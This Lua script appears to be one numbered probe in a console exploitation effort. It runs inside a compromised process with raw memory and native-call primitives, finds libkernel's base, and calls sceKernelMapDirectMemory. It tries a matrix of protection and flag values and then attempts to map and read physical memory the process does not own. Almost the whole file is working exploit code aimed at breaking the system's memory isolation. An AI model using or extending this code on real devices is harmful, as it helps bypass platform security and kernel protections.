-- CRASH_CLASS: MODERATE
-- PROBE 1523a: MapDirectMemory -- the payload's own prot/flags pair, then arbitrary physical
--
-- -- prior art:
--   probes/phase36_realargs/1522b_mapdm_fcall_offsets.lua
--     results/phase36_realargs/1522b_mapdm_fcall_offsets_20261109_234027.txt
--     -> libkernel+0x15020 answered Sony status 0x80020016 for a zero-length request, which
--        identifies it as sceKernelMapDirectMemory by BEHAVIOUR (the wrapper returns a Sony
--        status, so the call itself is well formed with six register arguments).
--        libkernel+0x17EF0 sceKernelAllocateDirectMemory(0, 0x150000000, 0x4000, 0x4000, 0,
--        &phys) returned rv=0 phys=0x110010000, matching 528f exactly.
--        The first real map -- prot 3, flags 0, that same owned phys -- took SIGSEGV(0x0b):
--        the capture's tail is the loader's 0x13371337 fault record.
--   probes/phase27_phys_memory/528f_mainthread_mapdm.lua -- died at flags=0x0 too (SROP).
--   .local/loader_payload/globals.lua:21-33 -- PROT_READ 0x1, PROT_WRITE 0x2, GPU_READ 0x10,
--     GPU_WRITE 0x20, MAP_NO_COALESCE 0x400000. So the payload's prot_rw is 0x33.
--   .local/loader_payload/gpu.lua:344 alloc_main_dmem -- the shape its author validated:
--     sceKernelMapDirectMemory(out, size, 0x33, 0x400000, phys_addr, size).
--   docs/DEAD_ENDS.md MapDM bullet.
--
-- Why: 1522b proved the entry point and the calling convention but used a bare prot 3 / flags 0.
-- The payload's own allocator passes prot 0x33 and flags 0x400000. If the kernel requires the GPU
-- bits or NO_COALESCE for a direct-memory object, the pair explains the 1522b fault with no other
-- change. Phase [F] then repeats the question that matters: does it map physical memory we do not
-- own? Every rung prints before it calls, so the last line of a truncated capture names the exact
-- shape that died. Phase [F] READS ONLY.

print("=== PROBE 1523a: MAPDIRECTMEMORY PROT/FLAGS MATRIX ===")
print("")

local function N(v)
    if type(v) == "number" then return v end
    if type(v) == "table" and v.tonumber then
        local ok, n = pcall(function() return v:tonumber() end)
        if ok and n then return n end
    end
    local ok, n = pcall(function() return tonumber(v) end)
    if ok and n then return n end
    return 0
end
local function addr_of(u)
    local n = N(u)
    if n >= 0x10000 and n < 0x8000000000 then return n end
    return nil
end
local function U(v) return uint64(v) end
local function mk(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return N(v) end
    return nil
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) % 4294967296 end
    return nil
end
local function wd(a, v)
    return pcall(function() memory.write_dword(a, uint64(v)) end)
end
local function fmt(v)
    if v == nil then return "nil" end
    local n = N(v)
    if n < 0 then n = n + 2 ^ 64 end
    return string.format("0x%X", n)
end
local function sid(v)
    local n = N(v)
    if n < 0 then n = n + 2 ^ 64 end
    return n
end
local function self_pid()
    local ok, v = pcall(function() return getpid() end)
    if ok then return N(v) end
    return -1
end
local PID0 = self_pid()
print("pid=" .. tostring(PID0))

local function call6(fn, rdi, rsi, rdx, rcx, r8, r9)
    local ok, rv = pcall(function()
        return native.fcall_with_rax(U(fn), U(0), U(rdi), U(rsi), U(rdx), U(rcx), U(r8), U(r9))
    end)
    if not ok then return nil end
    return N(rv)
end

-- ============================================================
-- [A] libkernel base
-- ============================================================
print("[A] libkernel base")
local function base_of(handle)
    local ib = memory.alloc(0x200)
    local iba = addr_of(ib)
    if not iba then return nil end
    wd(iba, 0x160)
    local ok, rv = pcall(function() return mk(593)(uint64(handle), uint64(iba)) end)
    if not ok or N(rv) ~= 0 then return nil end
    local lo = (rd(iba + 0x108) or 0) % 4294967296
    local hi = (rd(iba + 0x10C) or 0) % 4294967296
    if lo == 0 and hi == 0 then return nil end
    return hi * 4294967296 + lo
end
local lk = base_of(0x2001)
if not lk then print("  FAIL: no libkernel base"); return end
print("  libkernel text = " .. fmt(lk))
local alloc_fn = lk + 0x17EF0
local map_fn   = lk + 0x15020
print("  AllocateDirectMemory = " .. fmt(alloc_fn))
print("  MapDirectMemory      = " .. fmt(map_fn))

-- ============================================================
-- [A2] module table, so a fault RIP in a truncated capture can be attributed
-- ============================================================
print("")
print("[A2] userland modules (name + text base) for fault-RIP attribution")
do
    local cnt = 0
    for h = 0, 0x120 do
        local ib = memory.alloc(0x200)
        local iba = addr_of(ib)
        if not iba then break end
        wd(iba, 0x160)
        local ok, rv = pcall(function() return mk(593)(uint64(h), uint64(iba)) end)
        if ok and N(rv) == 0 then
            local nm = ""
            for i = 0, 47 do
                local b = rd(iba + 8 + i)
                if not b then break end
                local c = b % 256
                if c == 0 then break end
                if c >= 32 and c < 127 then nm = nm .. string.char(c) end
            end
            local lo = (rd(iba + 0x108) or 0) % 4294967296
            local hi = (rd(iba + 0x10C) or 0) % 4294967296
            if nm ~= "" and (lo ~= 0 or hi ~= 0) then
                cnt = cnt + 1
                print(string.format("   [%3d] %-28s text=0x%X%08X", h, nm, hi, lo))
            end
        end
    end
    print("  modules listed: " .. cnt)
end

-- ============================================================
-- [B] identity
-- ============================================================
print("")
print("[B] identity: map_fn(out, 0, 3, 0, 0, 0) must be refused")
local vo0 = memory.alloc(8); local vo0a = addr_of(vo0)
if not vo0a then print("  FAIL: out buffer"); return end
memory.write_qword(vo0, uint64(0))
local rvB = call6(map_fn, vo0a, 0, 3, 0, 0, 0)
if rvB == nil then
    print("  fcall did not return")
    print("VERDICT: libkernel+0x15020 not callable this boot.")
    return
end
print("  rv=" .. tostring(rvB) .. " (0x" .. string.format("%X", sid(rvB)) .. ")")

-- ============================================================
-- [C] owned block
-- ============================================================
print("")
print("[C] AllocateDirectMemory")
local pout = memory.alloc(8); local pouta = addr_of(pout)
if not pouta then print("  FAIL: out buffer"); return end
memory.write_qword(pout, uint64(0))
local rvC = call6(alloc_fn, U(0), U(0x150000000), U(0x4000), U(0x4000), U(0), U(pouta))
if rvC == nil then print("  fcall did not return"); return end
local phys = rq(pouta)
print("  rv=" .. tostring(rvC) .. " phys=" .. fmt(phys))
if rvC ~= 0 or not phys or phys < 0x1000 then
    print("VERDICT: allocation failed; nothing to map.")
    return
end

-- ============================================================
-- [D] prot / flags matrix.  Order: the payload's own pair first.
-- ============================================================
print("")
print("[D] prot/flags matrix on the owned block")
local combos = {
    -- the payload's own validated pair, byte for byte (gpu.lua:344 alloc_main_dmem)
    { p = 0x33, f = 0x400000, len = 0x4000, al = 0x4000,  tag = "payload p33/f400000 len4000 al4000" },
    { p = 0x33, f = 0x400000, len = 0x4000, al = 0x20000, tag = "p33/f400000 len4000 al20000" },
    { p = 0x33, f = 0x400000, len = 0x20000, al = 0x20000, tag = "p33/f400000 len20000 al20000" },
    { p = 0x03, f = 0x400000, len = 0x4000, al = 0x4000,  tag = "p3/f400000" },
    { p = 0x33, f = 0x0,      len = 0x4000, al = 0x4000,  tag = "p33/f0" },
    { p = 0x13, f = 0x400000, len = 0x4000, al = 0x4000,  tag = "p13/f400000" },
    { p = 0x01, f = 0x400000, len = 0x4000, al = 0x4000,  tag = "p1/f400000" },
}
local va_ok = nil
for _, c in ipairs(combos) do
    local vo = memory.alloc(8); local voaddr = addr_of(vo)
    if not voaddr then print("  ABORT: out buffer"); break end
    memory.write_qword(vo, uint64(0))
    print("  " .. c.tag .. "  phys=" .. fmt(phys) .. "  -> calling")
    local rv = call6(map_fn, voaddr, c.len, c.p, c.f, phys, c.al)
    if rv == nil then
        print("     *** fcall did not return -- this shape died ***")
        break
    end
    local va = rq(voaddr)
    print("     rv=" .. tostring(rv) .. " (0x" .. string.format("%X", sid(rv)) .. ") va=" .. fmt(va))
    if rv == 0 and va and va > 0x10000 then
        va_ok = va
        print("     *** MAP SUCCEEDED with " .. c.tag .. " ***")
        break
    end
end

if not va_ok then
    print("")
    print("VERDICT: no prot/flags combination returned a mapping.")
    print("pid_after=" .. tostring(self_pid()) .. " (was " .. tostring(PID0) .. ")")
    return
end

-- ============================================================
-- [E] is it real memory?
-- ============================================================
print("")
print("[E] the mapping at " .. fmt(va_ok))
local l = "  before: "
for i = 0, 7 do l = l .. string.format("%08X ", rd(va_ok + i * 4) or 0) end
print(l)
wd(va_ok, 0x4D415033)
local back = rd(va_ok)
print("  write 0x4D415033 -> " .. string.format("%08X", back or 0) ..
      (back == 0x4D415033 and "   (RW CONFIRMED)" or "   (not writable)"))

-- ============================================================
-- [F] arbitrary physical, READ ONLY
-- ============================================================
print("")
print("[F] physical addresses outside our allocation (READ ONLY)")
for i, pa in ipairs({ 0x0, 0x1000, 0x100000, 0x1000000 }) do
    if pa == phys then
        print("  [F" .. i .. "] ours, skipped")
    else
        local vo = memory.alloc(8); local voaddr = addr_of(vo)
        if not voaddr then print("  [F" .. i .. "] ABORT"); break end
        memory.write_qword(vo, uint64(0))
        print("  [F" .. i .. "] phys=" .. fmt(pa) .. " p=0x33 f=0x400000 -> calling")
        local rv = call6(map_fn, voaddr, 0x1000, 0x33, 0x400000, pa, 0x1000)
        if rv == nil then
            print("      *** fcall did not return ***")
            break
        end
        local va = rq(voaddr)
        print("      rv=" .. tostring(rv) .. " (0x" .. string.format("%X", sid(rv)) .. ") va=" .. fmt(va))
        if rv == 0 and va and va > 0x10000 then
            local d0, d1, d2, d3 = rd(va), rd(va + 4), rd(va + 8), rd(va + 12)
            if d0 then
                print(string.format("      READS: %08X %08X %08X %08X", d0, d1 or 0, d2 or 0, d3 or 0))
                print("      *** PHYSICAL " .. fmt(pa) .. " MAPPED ***")
            else
                print("      mapped, first read faulted")
            end
        end
    end
end

print("")
print("pid_after=" .. tostring(self_pid()) .. " (was " .. tostring(PID0) .. ")")
print("")
print("=== PROBE 1523a COMPLETE ===")
